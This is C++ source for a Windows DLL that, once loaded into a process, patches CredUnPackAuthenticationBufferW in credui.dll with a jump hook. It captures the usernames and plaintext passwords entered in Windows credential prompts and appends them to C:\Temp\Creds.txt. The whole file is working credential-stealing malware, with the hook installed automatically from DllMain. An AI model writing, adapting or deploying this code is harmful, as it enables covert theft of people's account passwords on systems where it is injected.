// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "wincred.h"
#include <iostream>
#include <fstream>
#include <atlstr.h>
#include <codecvt>
#include <locale>

#pragma comment(lib, "Credui.lib")

#define PATCH_LEN 5

SIZE_T bytesRead = 0;
SIZE_T bytesWritten = 0;
DWORD relative_offset; // offset from hooked function to our function

char originalBytes[PATCH_LEN] = {};

typedef BOOL(WINAPI* t_CredUnPackAuthenticationBufferW)(
    DWORD  dwFlags,
    PVOID  pAuthBuffer,
    DWORD  cbAuthBuffer,
    LPWSTR pszUserName,
    DWORD* pcchMaxUserName,
    LPWSTR pszDomainName,
    DWORD* pcchMaxDomainName,
    LPWSTR pszPassword,
    DWORD* pcchMaxPassword
);

FARPROC credUnPackAuthenticationBufferW;

VOID 
InstallHook()
{
    char patch[PATCH_LEN] = { 0 };
    memcpy_s(patch, 1, "\xE9", 1); // jmp
    memcpy_s(patch + 1, 4, &relative_offset, 4);
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)credUnPackAuthenticationBufferW, patch, PATCH_LEN, &bytesWritten);
}

BOOL 
WINAPI 
LogCred(DWORD dwFlags, PVOID pAuthBuffer, DWORD cbAuthBuffer, LPWSTR pszUserName, DWORD* pcchlMaxUserName, LPWSTR pszDomainName, DWORD* pcchMaxDomainName, LPWSTR pszPassword, DWORD* pcchMaxPassword)
{
    // Remove Hook
    BOOL status = WriteProcessMemory(GetCurrentProcess(), (LPVOID)credUnPackAuthenticationBufferW, originalBytes, PATCH_LEN, &bytesWritten);
    
    // Save creds to file 
    std::ofstream outfile;
    outfile.open("C:\\Temp\\Creds.txt", std::ios_base::app); 

    outfile << "----------" << std::endl;

    BOOL return_value = ((t_CredUnPackAuthenticationBufferW)credUnPackAuthenticationBufferW)(dwFlags, pAuthBuffer, cbAuthBuffer, pszUserName, pcchlMaxUserName, pszDomainName, pcchMaxDomainName, pszPassword, pcchMaxPassword);
    INT err = GetLastError();

    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string username = converter.to_bytes(pszUserName);
    std::string password = converter.to_bytes(pszPassword);

    if (!return_value)
    {
        outfile << "ERR: " << err << std::endl;
    } 
    else
    {
        outfile << "username: " << username << std::endl;
        outfile << "password: " << password << std::endl;
    }
    outfile.close();

    // Reapply hook
    InstallHook();

    return return_value;
}

VOID 
Run()
{
    // Get address of function to hook
    HMODULE hCredUI = LoadLibraryW(TEXT("credui.dll"));
    credUnPackAuthenticationBufferW = GetProcAddress(hCredUI, "CredUnPackAuthenticationBufferW");

    // Calculate Offset from hooked function to our proxy function
    PVOID hookFunction = &LogCred;
    DWORD src = (DWORD)credUnPackAuthenticationBufferW + PATCH_LEN;
    DWORD dst = (DWORD)hookFunction;
    relative_offset = (DWORD)(dst - src);

    // Save original bytes
    ReadProcessMemory(GetCurrentProcess(), credUnPackAuthenticationBufferW, originalBytes, PATCH_LEN, &bytesRead);

    // Install our hook
    InstallHook();
}

BOOL 
APIENTRY 
DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Run();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}